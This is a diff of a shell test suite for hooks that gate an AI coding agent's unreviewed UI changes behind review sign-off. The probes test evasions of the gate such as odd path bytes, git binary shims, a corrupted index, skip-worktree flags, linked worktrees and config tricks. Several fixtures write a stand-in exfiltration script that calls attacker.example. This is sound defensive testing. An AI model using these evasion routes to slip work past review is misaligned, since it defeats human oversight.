+signoff "$d" --pass test-integrity-auditor --pass harness-skeptic \
+  --pass contract-auditor --pass a11y-ssr-auditor >/dev/null 2>&1
+git -C "$d/src/lib/vendor" update-index --skip-worktree Modal.svelte
+printf '<div role="dialog" aria-modal="true">no focus trap</div>\n' > "$d/src/lib/vendor/Modal.svelte"
+expect_block "$d" "skip-worktree set inside an embedded gitlink still blocks"
+rm -rf "$d"
+
+# A file whose name contains a literal newline byte cannot be represented
+# by walk_hidden_dir's own newline-terminated output without corruption --
+# it would split across what every caller reads as two "lines", losing its
+# own directory prefix, and drop out of the hash silently. Reproduces one
+# layer below the quote-character probe above: git status collapses the
+# whole `tmp/` subtree to one (newline-free) line, so the byte is only
+# reachable once walk_hidden_dir expands that directory's own contents.
+#
+# NOT an expect_block-on-first-addition probe: with the guard genuinely
+# absent, a first-time addition still moves the hash to SOME different
+# value (still new work, still correctly blocked) and a naive version of
+# this probe stayed green with the fix fully reverted -- caught by testing
+# a REWRITE instead, matching the other collision probes above. And NOT a
+# hash-inequality check like those probes either: unlike the quote/colon/
+# non-ASCII fixes, which compute a correct, DIFFERENT hash for different
+# content, this one refuses outright (WORK_ERROR set, WORK_HASH empty) --
+# the fail-closed direction three review rounds asked for instead of a
+# silent misread. Two empty hashes are trivially "equal", so this checks
+# WORK_ERROR is set on both calls, not h1 != h2.
+d=$(new_repo) || exit 1
+(cd "$d" && printf 'tmp/\n' > .gitignore && git add -A && git commit -qm ign) >/dev/null 2>&1
+mkdir -p "$d/src/routes/tmp/$(printf 'a\nb')"
+printf '<h1>v1</h1>\n' > "$d/src/routes/tmp/$(printf 'a\nb')/Modal.svelte"
+e1=$(cd "$d" && CLAUDE_PROJECT_DIR="$d" bash -c '. .claude/hooks/work-hash.sh; compute_work_hash; echo "$WORK_ERROR"')
+printf '<script>fetch("https://attacker.example/steal")</script>\n' > "$d/src/routes/tmp/$(printf 'a\nb')/Modal.svelte"
+e2=$(cd "$d" && CLAUDE_PROJECT_DIR="$d" bash -c '. .claude/hooks/work-hash.sh; compute_work_hash; echo "$WORK_ERROR"')
+if printf '%s' "$e1" | grep -q "newline" && printf '%s' "$e2" | grep -q "newline"; then
+  ok "a newline in a hidden file's path refuses rather than silently dropping it"
+else
+  no "a newline in a hidden file's path refuses rather than silently dropping it" "e1=[$e1] e2=[$e2]"
+fi
+rm -rf "$d"
+
+# The probe above only reaches walk_hidden_dir's newline guard: git status
+# collapses a whole newly-ignored directory to one clean line before
+# ignored_matching_paths ever sees it, so a newline in a FILE's name never
+# reaches ignored_matching_paths's own separate guard. Reproduced here with
+# the newline in the top-level IGNORED PATH ITSELF, which is the only shape
+# that does reach it -- deleting ignored_matching_paths's own newline arm
+# left the full suite green without this probe.
+d=$(new_repo) || exit 1
+(cd "$d" && printf 'tmp*/\n' > .gitignore && git add -A && git commit -qm ign) >/dev/null 2>&1
+nldir="src/routes/tmp"$'\n'"X"
+mkdir -p "$d/$nldir"
+printf '<h1>v1</h1>\n' > "$d/$nldir/Modal.svelte"
+e1=$(cd "$d" && CLAUDE_PROJECT_DIR="$d" bash -c '. .claude/hooks/work-hash.sh; compute_work_hash; echo "$WORK_ERROR"')
+printf '<script>fetch("https://attacker.example/steal")</script>\n' > "$d/$nldir/Modal.svelte"
+e2=$(cd "$d" && CLAUDE_PROJECT_DIR="$d" bash -c '. .claude/hooks/work-hash.sh; compute_work_hash; echo "$WORK_ERROR"')
+if printf '%s' "$e1" | grep -q "newline" && printf '%s' "$e2" | grep -q "newline"; then
+  ok "a newline in the ignored path itself refuses rather than silently dropping it"
+else
+  no "a newline in the ignored path itself refuses rather than silently dropping it" "e1=[$e1] e2=[$e2]"
+fi
+rm -rf "$d"
+
+# add_ignored_tracked's own `-z` read (fixed for non-ASCII in round 6, but
+# never given a probe for the OTHER quoted-byte classes `-z` also fixes --
+# `"`, `\`, control bytes) is unpinned: reverting just its NUL-safe reading
+# back to plain `read -r` (keeping `-c core.quotePath=false`, which the
+# function's own comment says does not reach these bytes) left the full
+# suite green. A quote character in a FORCE-ADDED ignored path reproduces.
+d=$(new_repo) || exit 1
+(cd "$d" && printf 'tmp/\n' > .gitignore && git add -A && git commit -qm ign) >/dev/null 2>&1
+mkdir -p "$d/tmp"
+printf '<h1>v1</h1>\n' > "$d/tmp/qu\"ote.svelte"
+git -C "$d" add -f -- './tmp/qu"ote.svelte' >/dev/null 2>&1
+h1=$(cd "$d" && CLAUDE_PROJECT_DIR="$d" bash -c '. .claude/hooks/work-hash.sh; compute_work_hash; echo "$WORK_HASH"')
+printf '<script>fetch("https://attacker.example/steal")</script>\n' > "$d/tmp/qu\"ote.svelte"
+git -C "$d" add -f -- './tmp/qu"ote.svelte' >/dev/null 2>&1
+h2=$(cd "$d" && CLAUDE_PROJECT_DIR="$d" bash -c '. .claude/hooks/work-hash.sh; compute_work_hash; echo "$WORK_HASH"')
+if [ -n "$h1" ] && [ -n "$h2" ] && [ "$h1" != "$h2" ]; then
+  ok "a quote character in a force-added ignored path does not hash-collide across different content"
+else
+  no "a quote character in a force-added ignored path does not hash-collide across different content" "h1=[$h1] h2=[$h2]"
+fi
+rm -rf "$d"
+
+# `add_ignored_tracked`'s `git add -f -N` was run `>/dev/null 2>&1` with its
+# exit status never checked -- every byte fix above (non-ASCII, quote/
+# control-byte, colon-prefix pathspec magic) closes a way that ONE CALL can
+# come back C-quoted or unmatched, but none of them checks whether the call
+# itself simply failed for an unrelated reason (disk full, a permissions
+# problem, git misbehaving). An unchecked failure there reopens the exact
+# collision this function exists to close, in the fail-OPEN direction: the
+# path stays absent from the throwaway index and two completely different
+# bodies of the same force-tracked ignored file hash identically -- or, once
+# fixed, both refuse. No filesystem condition here reproduces a `git add -f`
+# failure without root or disk exhaustion, so this shims `git` on PATH to
+# fail only that one subcommand+flag pair, passing every other invocation
+# through to the real binary -- the same fault-injection shape harness-
+# skeptic used to find this live in this round's review.
+d=$(new_repo) || exit 1
+(cd "$d" && printf 'tmp/\n' > .gitignore && git add -A && git commit -qm ign) >/dev/null 2>&1
+mkdir -p "$d/tmp"
+printf '<h1>v1</h1>\n' > "$d/tmp/+page.svelte"
+git -C "$d" add -f -- tmp/+page.svelte >/dev/null 2>&1
+git -C "$d" commit -qm "force-tracked ignored v1" >/dev/null 2>&1
+fakebin=$(mktemp -d) || exit 1
+cat > "$fakebin/git" <<'SHIM'
+#!/bin/sh
+if [ "$1" = "add" ] && [ "$2" = "-f" ]; then
+  echo "fatal: shim refuses add -f" >&2
+  exit 1
+fi
+exec /usr/bin/git "$@"
+SHIM
+chmod +x "$fakebin/git"
+e1=$(cd "$d" && CLAUDE_PROJECT_DIR="$d" PATH="$fakebin:$PATH" bash -c '. .claude/hooks/work-hash.sh; compute_work_hash; echo "$WORK_ERROR"')
+printf '<script>fetch("https://attacker.example/steal")</script>\n' > "$d/tmp/+page.svelte"
+git -C "$d" add -f -- tmp/+page.svelte >/dev/null 2>&1
+e2=$(cd "$d" && CLAUDE_PROJECT_DIR="$d" PATH="$fakebin:$PATH" bash -c '. .claude/hooks/work-hash.sh; compute_work_hash; echo "$WORK_ERROR"')
+rm -rf "$fakebin"
+if printf '%s' "$e1" | grep -q "could not stage" && printf '%s' "$e2" | grep -q "could not stage"; then
+  ok "a failed git add -f on a force-added ignored path refuses rather than hash-colliding"
+else
+  no "a failed git add -f on a force-added ignored path refuses rather than hash-colliding" "e1=[$e1] e2=[$e2]"
+fi
+rm -rf "$d"
+
+# The fix above hardened the LOOP BODY (`git add -f`) and left the loop's
+# PRODUCER -- `git -c core.quotePath=false ls-files -z --cached --ignored
+# --exclude-standard` -- with its own exit status unchecked. `$?` right
+# after `done < <(...)` reads the WHILE loop's status, not the substituted
+# command's, so a failing producer was invisible: the loop simply never
+# iterates, no WORK_ERROR is set, and the force-tracked ignored path stays
+# silently absent from the throwaway index -- the identical collision one
+# line up from the one just fixed. Unlike every other probe in this
+# function's section, this needs NO git-BINARY-level fault injection (no
+# shim) -- but it DOES need a deterministic corruption of `.git/index`, and
+# appending random bytes is NOT that: git's index format ends in optional
+# "extension" records, each starting with a 4-byte signature whose first
+# byte's case decides whether an unrecognized one is silently skipped with a
+# warning (uppercase, 0x41-0x5A -- "ignoring XXXX extension", exit 0) or
+# fatal (anything else -- "index uses xxxx extension, which we do not
+# understand", exit 128). Appending past the index's own trailing checksum
+# also means the "signature" git reads is really the first bytes of that
+# PRE-EXISTING checksum, not the appended bytes themselves -- so whether the
+# probe flaked depended on the content already in the repo's index, not on
+# what was appended to it. Confirmed by sweeping all 256 possible leading
+# checksum bytes against the real index format: exactly 26 -- the
+# contiguous uppercase range 0x41-0x5A -- make `git ls-files` exit 0 instead
+# of 128, i.e. 1 in 10 index states, so the probe flaked red on a healthy
+# guard for roughly 1 in 5 full runs (each probe draws twice: 1 - (0.9)^2).
+# A TRUNCATED index has no such escape hatch: it is short of
+# even its own fixed-size header/checksum trailer, and `git ls-files`
+# refuses deterministically (confirmed 40/40 trials on the real git binary)
+# rather than reading a byte pattern that might parse as *something*. The
+# minimum for a valid-looking index is 32 bytes (12-byte header + 20-byte
+# checksum trailer, no entries) -- confirmed by truncating to 0, 1, 10, 11,
+# 12, and 31 bytes (all refuse) versus exactly 32 (accepted as a valid, if
+# empty, index). The 10 bytes used below is comfortably under that boundary;
+# do not raise it anywhere near 32 without re-verifying the margin.
+d=$(new_repo) || exit 1
+(cd "$d" && printf 'tmp/\n' > .gitignore && git add -A && git commit -qm ign) >/dev/null 2>&1
+mkdir -p "$d/tmp"
+printf '<button>Open</button>\n' > "$d/tmp/+page.svelte"
+git -C "$d" add -f -- tmp/+page.svelte >/dev/null 2>&1
+git -C "$d" commit -qm "force-tracked ignored v1" >/dev/null 2>&1
+cp "$d/.git/index" "$d/.git/index.bak"
+head -c 10 "$d/.git/index" > "$d/.git/index.trunc" && mv "$d/.git/index.trunc" "$d/.git/index"
+e1=$(cd "$d" && CLAUDE_PROJECT_DIR="$d" bash -c '. .claude/hooks/work-hash.sh; compute_work_hash; echo "$WORK_ERROR"')
+cp "$d/.git/index.bak" "$d/.git/index"
+printf '<script>fetch("https://attacker.example/steal")</script>\n' > "$d/tmp/+page.svelte"
+git -C "$d" add -f -- tmp/+page.svelte >/dev/null 2>&1
+head -c 10 "$d/.git/index" > "$d/.git/index.trunc" && mv "$d/.git/index.trunc" "$d/.git/index"
+e2=$(cd "$d" && CLAUDE_PROJECT_DIR="$d" bash -c '. .claude/hooks/work-hash.sh; compute_work_hash; echo "$WORK_ERROR"')
+if printf '%s' "$e1" | grep -q "could not list tracked-but-ignored paths" && printf '%s' "$e2" | grep -q "could not list tracked-but-ignored paths"; then
+  ok "a corrupt index during add_ignored_tracked's own enumeration refuses rather than hash-colliding"
+else
+  no "a corrupt index during add_ignored_tracked's own enumeration refuses rather than hash-colliding" "e1=[$e1] e2=[$e2]"
+fi
+rm -rf "$d"
+
+# `review-board-gate.sh`'s own `git rev-parse --git-dir >/dev/null 2>&1 ||
+# exit 0` conflated "genuinely not a git repository" (the one case where
+# silently doing nothing is correct) with "git failed for ANY reason" --
+# every OTHER error path in this same file was converted to `emit_block` in
+# this body of work, but this one line kept its bare `|| exit 0` and only
+# grew a comment claiming the narrower meaning. A `git` shim that fails only
+# `rev-parse --git-dir`, for a reason that has nothing to do with being
+# outside a repository, reproduces the fail-open: an unreviewed
+# `role="dialog"` component in a real repo cleared the gate with no output
+# at all. The fix matches on git's own "not a git repository" message rather
+# than trusting any nonzero exit to mean the same thing.
+d=$(new_repo) || exit 1
+printf '<div role="dialog" aria-modal="true">never reviewed</div>\n' > "$d/src/routes/Modal.svelte"
+fakebin=$(mktemp -d) || exit 1
+cat > "$fakebin/git" <<'SHIM'
+#!/bin/sh
+if [ "$1" = "rev-parse" ] && [ "$2" = "--git-dir" ]; then
+  echo "fatal: something else entirely broke" >&2
+  exit 128
+fi
+exec /usr/bin/git "$@"
+SHIM
+chmod +x "$fakebin/git"
+out=$(cd "$d" && CLAUDE_PROJECT_DIR="$d" PATH="$fakebin:$PATH" bash .claude/hooks/review-board-gate.sh </dev/null 2>&1)
+rm -rf "$fakebin"
+printf '%s' "$out" | grep -q '"decision"[[:space:]]*:[[:space:]]*"block"' &&
+  ok "git rev-parse --git-dir failing for a non-repo reason still blocks" ||
+  no "git rev-parse --git-dir failing for a non-repo reason still blocks" "gate output: $out"
+rm -rf "$d"
+
+# The genuinely-not-a-repo case must still be silent, since that is the one
+# case `git rev-parse --git-dir` failing is actually supposed to allow.
+d=$(mktemp -d) || exit 1
+assert_sandbox "$d" >/dev/null
+out=$(cd "$d" && CLAUDE_PROJECT_DIR="$d" bash "$HOOKS_SRC/review-board-gate.sh" </dev/null 2>&1)
+[ -z "$out" ] &&
+  ok "a directory that is genuinely not a git repo still produces no output" ||
+  no "a directory that is genuinely not a git repo still produces no output" "gate output: $out"
+rm -rf "$d"
+
+# `is_artifact`'s old `local IFS=/; for seg in $p` left `$p` UNQUOTED, which
+# re-enables PATHNAME EXPANSION as well as the intended word-splitting -- a
+# path segment that is itself a glob (`tmp/*/Modal.svelte`) expanded against
+# the CWD, and `node_modules` is always present in a real checkout, so a
+# bare `*` segment always matched ARTIFACT_DIRS and the file silently
+# dropped out of the walk. Not reachable under `src/`/`static/` (the
+# src-first rule returns before reaching a later glob segment), so this
+# needs a hidden directory at the repo root, matching the shape used
+# throughout this file (`tmp/`).
+d=$(new_repo) || exit 1
+(cd "$d" && printf 'tmp/\n' > .gitignore && git add -A && git commit -qm ign) >/dev/null 2>&1
+mkdir -p "$d/tmp/*"
+printf '<button>Open</button>\n' > "$d/tmp/*/Modal.svelte"
+signoff "$d" --pass test-integrity-auditor --pass harness-skeptic \
+  --pass contract-auditor --pass a11y-ssr-auditor >/dev/null 2>&1
+printf '<div role="dialog" aria-modal="true">no focus trap</div>\n' > "$d/tmp/*/Modal.svelte"
+# The repo root also needs a real ARTIFACT_DIRS-named directory for the glob
+# to land on, sorting before `src`/`static` (which short-circuit is_artifact's
+# scan the same way whether the bug is present or not) -- `node_modules` is
+# what a real checkout always has and what the comment above describes.
+# Without this, the fixture's own root (src/static/scripts/seed.txt, no
+# node_modules) happens to hit the `src|static` early-return before any
+# ARTIFACT_DIRS name, so the broken and fixed code produce the same result
+# and this probe passes either way (confirmed: reverting the fix left it
+# green until this directory was added).
+mkdir -p "$d/node_modules"
+expect_block "$d" "a glob character in a hidden path is not expanded against the CWD"
+rm -rf "$d"
+
+# `find -L "$dir" ...` with `$dir` passed bare: a directory literally named
+# `-lab` is parsed as an unknown OPTION FLAG rather than a path, `find`
+# errors to stderr (swallowed by every `2>/dev/null` downstream), and the
+# whole directory silently drops out of the walk with no refusal. This fixes
+# walk_hidden_dir's own `./` prefix (the arm this probe actually pins --
+# confirmed by break-and-restore; an earlier version of this comment claimed
+# it also pinned the depth/cap pre-check loop's separate `./` prefix a few
+# lines below in work-hash.sh, which is false: deleting only that arm left
+# the suite green here, because walk_hidden_dir still enumerates a READABLE
+# rewrite correctly on its own. See the next probe for what the pre-check
+# loop's arm actually guards.)
+d=$(new_repo) || exit 1
+(cd "$d" && printf -- '-lab/\n' > .gitignore && git add -A && git commit -qm ign) >/dev/null 2>&1
+mkdir -p -- "$d/-lab"
+printf '<button>Open</button>\n' > "$d/-lab/Modal.svelte"
+signoff "$d" --pass test-integrity-auditor --pass harness-skeptic \
+  --pass contract-auditor --pass a11y-ssr-auditor >/dev/null 2>&1
+printf '<div role="dialog" aria-modal="true">no focus trap</div>\n' > "$d/-lab/Modal.svelte"
+expect_block "$d" "a hidden directory name starting with a dash is not mistaken for a find option"
+rm -rf "$d"
+
+# The depth/cap pre-check loop's OWN `./` prefix (work-hash.sh, just before
+# the d12/d13 depth check) is a second, independent arm from walk_hidden_dir's.
+# It guards the readability probe that fires for a genuinely unreadable
+# subdirectory. Deleting only this arm leaves the probe above green (a
+# readable rewrite still reaches the hash via walk_hidden_dir's intact
+# prefix), so it needs its own fixture: an UNREADABLE subdirectory nested
+# inside a dash-named ignored directory. With the prefix gone, `find -L -lab
+# ...` for the permission probe is parsed as an unknown option and returns
+# empty -- as if nothing were unreadable -- so the loop falls through to
+# walk_hidden_dir, which itself cannot read INTO a chmod 000 directory
+# either. The dedicated "cannot be read" refusal this loop exists to raise
+# never fires, and an unreviewed component inside the unreadable directory
+# clears the gate with no error at all.
+d=$(new_repo) || exit 1
+(cd "$d" && printf -- '-lab/\n' > .gitignore && git add -A && git commit -qm ign) >/dev/null 2>&1
+mkdir -p -- "$d/-lab/secret"
+printf '<div role="dialog" aria-modal="true">never reviewed</div>\n' > "$d/-lab/secret/Modal.svelte"
+chmod 000 "$d/-lab/secret"
+out=$(cd "$d" && CLAUDE_PROJECT_DIR="$d" bash .claude/hooks/review-board-gate.sh </dev/null 2>&1)
+chmod 755 "$d/-lab/secret"
+printf '%s' "$out" | grep -q "cannot be read" &&
+  ok "a dash-prefixed hidden directory's unreadable subdirectory blocks" ||
+  no "a dash-prefixed hidden directory's unreadable subdirectory blocks" "gate was silent: $out"
+rm -rf "$d"
+
+# `git status --ignored=matching` fatals outright when `status.
+# showUntrackedFiles=no` is also in effect ("Unsupported combination of
+# ignored and untracked-files arguments", exit 128) -- not degraded, dead.
+# Every call site redirected stderr to /dev/null, so the fatal read as
+# "nothing is ignored" rather than as an error. There are SIX
+# `--ignored=matching` call sites total (two in `compute_work_hash`'s own
+# enumeration, one each in the gitlink and worktree ignored-scans, one in
+# `waiver_forbidden_paths`, plus an emptiness-only check that never parses
+# individual paths and so was never vulnerable). Setting the config on THIS
+# repo directly (no embedded repo or worktree needed) reaches the THREE
+# sites that run against the current repo without `-C`; the worktree and
+# gitlink sites have their own dedicated probes elsewhere in this file.
+# Both the gate and the waiver path are checked here, since they read
+# different enumerations.
+d=$(new_repo) || exit 1
+(cd "$d" && printf 'lab/\n' > .gitignore && git add -A && git commit -qm ign) >/dev/null 2>&1
+signoff "$d" --pass test-integrity-auditor --pass harness-skeptic \
+  --pass contract-auditor --pass a11y-ssr-auditor >/dev/null 2>&1
+mkdir -p "$d/lab"
+printf '<div role="dialog" aria-modal="true">forbidden</div>\n' > "$d/lab/Modal.svelte"
+git -C "$d" config status.showUntrackedFiles no
+expect_block "$d" "status.showUntrackedFiles=no does not defeat the ignored-directory scan on the gate path"
+out=$(signoff "$d" --waive --grounds formatting-only --reason r 2>&1)
+printf '%s' "$out" | grep -q "Modal.svelte" &&
+  ok "status.showUntrackedFiles=no does not defeat the ignored-directory scan on the waiver path" ||
+  no "status.showUntrackedFiles=no does not defeat the ignored-directory scan on the waiver path" "waived cleanly: $out"
+rm -rf "$d"
+
+# The linked-worktree guard's `--ignored=matching` scan (mirroring the
+# gitlink one) was entirely absent, not merely defeatable -- a worktree's
+# own committed .gitignore hid a component from status with no config lie
+# needed at all.
+#
+# The `.gitignore` rule is committed and SIGNED OFF in the MAIN repo
+# BEFORE the branch is cut, so `wtbranch`'s tip is the SAME commit the
+# outer repo is already at (no divergence for the ref sweep to catch) AND
+# there is no OTHER unreviewed work outstanding (a first version of this
+# probe skipped the sign-off entirely, so expect_block passed trivially on
+# the .gitignore commit being new unreviewed work, without the ignored-scan
+# guard ever being exercised -- caught by reverting the guard and finding
+# the probe still passed). Modal.svelte is added UNCOMMITTED in the
+# worktree, same as the showUntrackedFiles=no probe's Sneaky.svelte, so the
+# only thing left that could make this block is the guard under test.
+d=$(new_repo) || exit 1
+(cd "$d" && printf 'ui/\n' > .gitignore && git add -A && git commit -qm ign) >/dev/null 2>&1
+signoff "$d" --pass test-integrity-auditor --pass harness-skeptic \
+  --pass contract-auditor --pass a11y-ssr-auditor >/dev/null 2>&1
+wt=$(mktemp -d) || exit 1
+rm -rf "$wt"
+git -C "$d" branch wtbranch >/dev/null 2>&1
+git -C "$d" worktree add "$wt" wtbranch -q >/dev/null 2>&1
+mkdir -p "$wt/ui"
+printf '<div role="dialog" aria-modal="true">forbidden</div>\n' > "$wt/ui/Modal.svelte"
+expect_block "$d" "a component hidden by a linked worktree's own .gitignore still blocks"
+git -C "$d" worktree remove "$wt" --force >/dev/null 2>&1
+rm -rf "$wt"
+rm -rf "$d"
+
+# The waiver-side gitlink expansion still used plain `ls-files` (tracked
+# only), so an untracked component behind an embedded repo's own
+# `status.showUntrackedFiles=no` waived cleanly with the round-2 fix in
+# place -- it only appeared fixed because the demonstrating fixture sat
+# under `src/`, where the refusal actually fired on the gitlink's own
+# tracked `.gitignore` matching the `src/` WAIVER_NEVER prefix, never on
+# the hidden component itself. `scripts/` is outside every WAIVER_NEVER
+# pattern, so this isolates the real gap. Checked directly against
+# waiver_forbidden_paths, not just the end-to-end signoff flow: the whole
+# gate also refuses via compute_work_hash's OWN dirty-embedded-repo check,
+# which would mask this exact function still being blind.
+#
+# What this fixture actually pins is NOT the `--cached --others
+# --exclude-standard` expansion described above -- the component here sits
+# inside `ui/`, which the vendor repo's OWN `.gitignore` hides, and git
+# collapses an entirely-ignored directory to one `!!` line that `--others`
+# never lists at all. It is caught instead by the separate blanket refusal
+# a few lines further down (`status --porcelain --ignored=matching`, "has
+# content ... that a waiver cannot individually verify"), which fires on
+# ANY status output for the gitlink -- untracked, modified, or ignored --
+# and so subsumes the `--others` expansion for this exact fixture. Reverting
+# the `--others --exclude-standard` line to plain `ls-files` leaves this
+# probe green; reverting the blanket refusal fails it. Correcting the
+# earlier claim that this probe "isolates the real gap" in that line --
+# it isolates a real gap, just not that one.
+d=$(new_repo) || exit 1
+mkdir -p "$d/scripts/vendor/ui"
+(cd "$d/scripts/vendor" && git init -q && printf 'ui/\n' > .gitignore && echo r > README.txt \
+  && git add -A && git commit -qm v && git config status.showUntrackedFiles no) >/dev/null 2>&1
+printf '<div role="dialog" aria-modal="true">no trap</div>\n' > "$d/scripts/vendor/ui/Modal.svelte"
+out=$(cd "$d" && CLAUDE_PROJECT_DIR="$d" bash -c '. .claude/hooks/work-hash.sh; waiver_forbidden_paths; echo "F=[$WAIVER_FORBIDDEN] E=[$WORK_ERROR]"')
+printf '%s' "$out" | grep -q "vendor" &&
+  ok "waiver_forbidden_paths itself catches an untracked component behind an embedded showUntrackedFiles=no" ||
+  no "waiver_forbidden_paths itself catches an untracked component behind an embedded showUntrackedFiles=no" "$out"
 rm -rf "$d"
 
 printf '\n%d passed, %d failed\n' "$pass" "$fail"
